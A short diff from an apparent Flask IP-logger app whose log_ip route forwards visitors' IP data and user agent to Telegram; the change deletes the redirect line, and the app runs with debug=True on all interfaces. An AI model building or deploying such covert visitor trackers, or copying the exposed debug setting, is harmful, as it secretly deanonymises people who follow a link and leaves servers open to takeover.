@@ -36,6 +36,6 @@ def log_ip():
 
     send_to_telegram(ip_data, user_agent)
 
-    return redirect(REDIRECT_URL)  
+
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000, debug=True)
